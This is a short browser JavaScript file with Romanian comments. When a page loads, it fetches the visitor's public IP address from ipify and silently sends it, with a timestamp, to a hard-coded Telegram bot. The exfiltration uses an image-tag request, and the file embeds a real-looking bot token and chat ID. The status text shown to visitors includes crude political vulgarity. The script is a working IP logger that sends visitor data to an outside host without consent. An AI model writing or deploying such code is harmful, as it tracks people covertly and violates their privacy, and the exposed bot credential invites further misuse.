// Configurare
const TELEGRAM_BOT_TOKEN = '7618241698:AAHHE3cd5y73fINIlzsMwTKak50BgB5VQc4'; // Înlocuiți cu token-ul botului dvs
const TELEGRAM_CHAT_ID = '7070473485';     // Înlocuiți cu chat ID-ul dvs

async function getIP() {
    console.log('🔍 Începem preluarea IP-ului...');
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        console.log('📡 Răspuns primit de la ipify:', response.status, response.statusText);
        
        const data = await response.json();
        console.log('✅ IP detectat:', data.ip);
        return data.ip;
    } catch (error) {
        console.error('❌ Eroare la preluarea IP-ului:', error);
        return null;
    }
}

async function sendToTelegram(ip) {
    console.log('📤 Începem trimiterea către Telegram...');
    const message = `🔔 Nou acces detectat!\nIP: ${ip}\nTimestamp: ${new Date().toLocaleString()}`;
    console.log('📝 Mesaj pregătit:', message);
    
    return new Promise((resolve) => {
        const img = new Image();
        const timeoutId = setTimeout(() => {
            console.log('✅ Timeout atins - mesajul a fost probabil trimis');
            resolve(true);
        }, 1500); // Așteptăm 1.5 secunde înainte să considerăm mesajul trimis

        img.onload = img.onerror = () => {
            clearTimeout(timeoutId);
            console.log('✅ Mesaj trimis către Telegram');
            resolve(true);
        };

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
        console.log('🔗 URL Telegram:', url);
        img.src = url;
    });
}

async function init() {
    console.log('🚀 Aplicația pornește...');
    const statusElement = document.getElementById('status');
    
    const ip = await getIP();
    if (!ip) {
        console.error('❌ Nu s-a putut prelua IP-ul');
        statusElement.textContent = 'Eroare la preluarea IP-ului';
        return;
    }

    statusElement.textContent = 'Se trimite notificarea...';
    console.log('⏳ Se trimite către Telegram...');
    
    const sent = await sendToTelegram(ip);
    if (sent) {
        console.log('✨ Proces finalizat cu succes');
        statusElement.textContent = 'IP detectat și trimis cu succes! Mersi frate! Mezmect trump muie la cai';
        // Resetăm textul după 3 secunde
        setTimeout(() => {
            statusElement.textContent = 'Așteptare...';
        }, 3000);
    }
}

// Pornește procesul când pagina se încarcă
console.log('📱 Script inițializat, așteptăm încărcarea paginii...');
window.addEventListener('load', init); 